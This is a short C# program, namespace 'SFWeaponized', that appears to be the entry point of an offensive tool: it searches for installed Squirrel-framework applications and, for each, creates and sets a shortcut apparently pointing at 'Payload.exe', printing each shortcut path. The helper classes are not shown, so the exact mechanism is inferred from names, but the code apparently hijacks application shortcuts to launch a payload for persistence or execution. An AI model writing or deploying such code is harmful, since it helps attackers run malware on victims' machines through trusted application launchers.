using System;

namespace SFWeaponized
{
    internal class Program
    {
        
        public static SquirrelAppManager SquirrelAppManager;

        static void Main(string[] args)
        {
            SquirrelAppManager = new SquirrelAppManager("Payload.exe");
            SquirrelAppManager.StartSearch();

            foreach (var app in SquirrelAppManager.AppList)
            {
                app.CreateShortcut();
                app.SetShortcut();

                Console.WriteLine(app.ShortcutPath);
            }

            Console.Read();
        }
    }
}
